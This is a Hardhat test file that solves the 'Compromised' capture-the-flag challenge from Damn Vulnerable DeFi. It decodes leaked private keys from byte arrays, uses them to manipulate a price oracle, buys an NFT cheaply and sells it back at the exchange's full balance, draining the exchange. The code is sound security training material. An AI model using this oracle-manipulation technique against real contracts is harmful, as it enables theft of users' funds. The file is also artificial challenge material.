const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        let serverMsgBytes = [0x4d,0x48,0x68,0x6a,0x4e,0x6a,0x63,0x34,0x5a,0x57,0x59,0x78,0x59,0x57,0x45,0x30,0x4e,0x54,0x5a,0x6b,0x59,0x54,0x59,0x31,0x59,0x7a,0x5a,0x6d,0x59,0x7a,0x55,0x34,0x4e,0x6a,0x46,0x6b,0x4e,0x44,0x51,0x34,0x4f,0x54,0x4a,0x6a,0x5a,0x47,0x5a,0x68,0x59,0x7a,0x42,0x6a,0x4e,0x6d,0x4d,0x34,0x59,0x7a,0x49,0x31,0x4e,0x6a,0x42,0x69,0x5a,0x6a,0x42,0x6a,0x4f,0x57,0x5a,0x69,0x59,0x32,0x52,0x68,0x5a,0x54,0x4a,0x6d,0x4e,0x44,0x63,0x7a,0x4e,0x57,0x45,0x35,0x4d,0x48,0x67,0x79,0x4d,0x44,0x67,0x79,0x4e,0x44,0x4a,0x6a,0x4e,0x44,0x42,0x68,0x59,0x32,0x52,0x6d,0x59,0x54,0x6c,0x6c,0x5a,0x44,0x67,0x34,0x4f,0x57,0x55,0x32,0x4f,0x44,0x56,0x6a,0x4d,0x6a,0x4d,0x31,0x4e,0x44,0x64,0x68,0x59,0x32,0x4a,0x6c,0x5a,0x44,0x6c,0x69,0x5a,0x57,0x5a,0x6a,0x4e,0x6a,0x41,0x7a,0x4e,0x7a,0x46,0x6c,0x4f,0x54,0x67,0x33,0x4e,0x57,0x5a,0x69,0x59,0x32,0x51,0x33,0x4d,0x7a,0x59,0x7a,0x4e,0x44,0x42,0x69,0x59,0x6a,0x51,0x34];
        let serverMsg1 = [0x4d,0x48,0x68,0x6a,0x4e,0x6a,0x63,0x34,0x5a,0x57,0x59,0x78,0x59,0x57,0x45,0x30,0x4e,0x54,0x5a,0x6b,0x59,0x54,0x59,0x31,0x59,0x7a,0x5a,0x6d,0x59,0x7a,0x55,0x34,0x4e,0x6a,0x46,0x6b,0x4e,0x44,0x51,0x34,0x4f,0x54,0x4a,0x6a,0x5a,0x47,0x5a,0x68,0x59,0x7a,0x42,0x6a,0x4e,0x6d,0x4d,0x34,0x59,0x7a,0x49,0x31,0x4e,0x6a,0x42,0x69,0x5a,0x6a,0x42,0x6a,0x4f,0x57,0x5a,0x69,0x59,0x32,0x52,0x68,0x5a,0x54,0x4a,0x6d,0x4e,0x44,0x63,0x7a,0x4e,0x57,0x45,0x35]
        let serverMsg2 = [0x4d,0x48,0x67,0x79,0x4d,0x44,0x67,0x79,0x4e,0x44,0x4a,0x6a,0x4e,0x44,0x42,0x68,0x59,0x32,0x52,0x6d,0x59,0x54,0x6c,0x6c,0x5a,0x44,0x67,0x34,0x4f,0x57,0x55,0x32,0x4f,0x44,0x56,0x6a,0x4d,0x6a,0x4d,0x31,0x4e,0x44,0x64,0x68,0x59,0x32,0x4a,0x6c,0x5a,0x44,0x6c,0x69,0x5a,0x57,0x5a,0x6a,0x4e,0x6a,0x41,0x7a,0x4e,0x7a,0x46,0x6c,0x4f,0x54,0x67,0x33,0x4e,0x57,0x5a,0x69,0x59,0x32,0x51,0x33,0x4d,0x7a,0x59,0x7a,0x4e,0x44,0x42,0x69,0x59,0x6a,0x51,0x34]

        function decodeBytesOfBase64(array) {
            var result = "";
            for (var i = 0; i < array.length; i++) {
            //   result += String.fromCharCode(parseInt(array[i], 2));
              result += String.fromCharCode(array[i]);
            }

            return (new Buffer.from(result, "base64")).toString()
          }
        serverMsgString1 = decodeBytesOfBase64(serverMsg1)  
        serverMsgString2 = decodeBytesOfBase64(serverMsg2) 
          
        console.log(serverMsgString1)
        console.log(serverMsgString2)

        //it seems server messages are private keys
        //Let's build the corresponding wallets

        let wallet1 = new ethers.Wallet(serverMsgString1, ethers.provider)
        let wallet2 = new ethers.Wallet(serverMsgString2, ethers.provider)

        console.log(wallet1.address)
        console.log(wallet2.address)

        const PRICE_TO_SET = ethers.utils.parseEther('0.01');
        await this.oracle.connect(wallet1).postPrice("DVNFT",PRICE_TO_SET)
        await this.oracle.connect(wallet2).postPrice("DVNFT",PRICE_TO_SET)

        console.log(await this.nftToken.balanceOf(attacker.address))
        let tx = await this.exchange.connect(attacker).buyOne({value: PRICE_TO_SET}) 

        let token = await this.exchange.token()
        console.log("---", token)
        console.log(await this.nftToken.balanceOf(attacker.address))

        const receipt = await ethers.provider.getTransactionReceipt(tx.hash);
        let abi = [ "event TokenBought(address indexed buyer, uint256 tokenId, uint256 price)" ];
        let iface = new ethers.utils.Interface(abi);
        let log = iface.parseLog(receipt.logs[1]); // here you can add your own logic to find the correct log
        let tokenId = log.args.tokenId;

        console.log(log.args.tokenId)

        const EXCHANGE_INITIAL_ETH_BALANCE2 = ethers.utils.parseEther('9990.01');
        await this.oracle.connect(wallet1).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE2)
        await this.oracle.connect(wallet2).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE2)

        await this.nftToken.connect(attacker).approve(this.exchange.address,tokenId)
        await this.exchange.connect(attacker).sellOne(tokenId)

        await this.oracle.connect(wallet1).postPrice("DVNFT",INITIAL_NFT_PRICE)
        await this.oracle.connect(wallet2).postPrice("DVNFT",INITIAL_NFT_PRICE)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
